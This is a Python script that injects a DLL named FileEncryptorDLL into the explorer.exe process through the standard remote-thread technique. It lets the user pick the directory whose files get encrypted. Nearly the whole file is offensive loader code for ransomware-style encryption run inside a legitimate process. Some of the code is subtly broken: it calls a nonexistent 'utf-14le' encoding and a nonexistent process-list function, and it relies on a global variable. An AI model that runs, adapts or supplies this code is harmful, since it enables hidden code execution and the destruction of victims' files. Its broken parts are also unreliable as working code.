import ctypes
import sys
import os
from ctypes import wintypes
DEFAULT_DLL_PATH = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'FileEncryptorDLL', 'x64', 'Release', 'FileEncryptorDLL.dll')
DEFAULT_TARGET_DIR = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'FilesToEncrypt')
def inject_dll(pid, dll_path):
    # Convert to absolute path and verify existence
    dll_path = os.path.abspath(dll_path)
    if not os.path.exists(dll_path):
        print(f"[!] DLL not found at: {dll_path}")
        return False
    os.environ['ENCRYPTION_TARGET'] = target_dir
    # Define proper types
    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    OpenProcess.restype = wintypes.HANDLE

    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    VirtualAllocEx.restype = wintypes.LPVOID

    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    WriteProcessMemory.restype = wintypes.BOOL

    GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleW
    GetModuleHandle.argtypes = [wintypes.LPCWSTR]
    GetModuleHandle.restype = wintypes.HMODULE

    GetProcAddress = ctypes.windll.kernel32.GetProcAddress
    GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_char_p]  # ← Changed to c_char_p
    GetProcAddress.restype = wintypes.LPVOID

    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_ulong), ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    CreateRemoteThread.restype = wintypes.HANDLE

    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [wintypes.HANDLE]
    CloseHandle.restype = wintypes.BOOL

    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    process = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process:
        print(f"[!] Failed to open process (Error: {ctypes.get_last_error()})")
        return False

    try:
        # Allocate memory
        dll_path_remote = VirtualAllocEx(
            process, 
            None,
            (len(dll_path) + 1) * 2,
            0x3000,
            0x40
        )
        if not dll_path_remote:
            print(f"[!] Failed to allocate memory (Error: {ctypes.get_last_error()})")
            return False

        # Write DLL path (Unicode)
        written = ctypes.c_size_t(0)
        dll_path_encoded = dll_path.encode('utf-14le') + b'\x00\x00'
        if not WriteProcessMemory(
            process,
            dll_path_remote,
            dll_path_encoded,
            len(dll_path_encoded),
            ctypes.byref(written)
        ):
            print(f"[!] Failed to write memory (Error: {ctypes.get_last_error()})")
            return False

        # Get LoadLibraryW address
        kernel32 = GetModuleHandle("kernel32.dll")
        if not kernel32:
            print(f"[!] Failed to get kernel32 handle (Error: {ctypes.get_last_error()})")
            return False

        load_library = GetProcAddress(kernel32, b"LoadLibraryW")  # ← Added 'b' for bytes
        if not load_library:
            print(f"[!] Failed to get LoadLibraryW address (Error: {ctypes.get_last_error()})")
            return False

        # Create remote thread
        thread = CreateRemoteThread(
            process,
            None,
            0,
            load_library,
            dll_path_remote,
            0,
            None
        )
        if not thread:
            print(f"[!] Failed to create remote thread (Error: {ctypes.get_last_error()})")
            return False

        # Wait for completion
        ctypes.windll.kernel32.WaitForSingleObject(thread, 5000)
        CloseHandle(thread)

        print("[+] DLL injected successfully!")
        return True

    finally:
        CloseHandle(process)

if __name__ == "__main__":
    print("=== Configurable FileEncryptor Injector ===")
    
    # Get user inputs
    dll_path = input(f"DLL path [{DEFAULT_DLL_PATH}]: ").strip() or DEFAULT_DLL_PATH
    target_dir = input(f"Target directory [{DEFAULT_TARGET_DIR}]: ").strip() or DEFAULT_TARGET_DIR
    
    # Verify paths
    if not os.path.exists(dll_path):
        print(f"[!] DLL not found at {dll_path}")
        sys.exit(1)
        
    os.makedirs(target_dir, exist_ok=True) 
    explorer_pid = None
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                explorer_pid = proc.info['pid']
                break
    except ImportError:
        print("[!] psutil not available, using first explorer.exe instance")
        explorer_pid = next(p.pid for p in ctypes.windll.kernel32._GetProcessList() if "explorer.exe" in p.name)

    if not explorer_pid:
        print("[!] Could not find explorer.exe process")
        sys.exit(1)
    
    print(f"[*] Targeting PID: {explorer_pid} (explorer.exe)")
    
    if inject_dll(explorer_pid, dll_path):
        print("[+] Injection successful!")
    else:
        print("[!] Injection failed")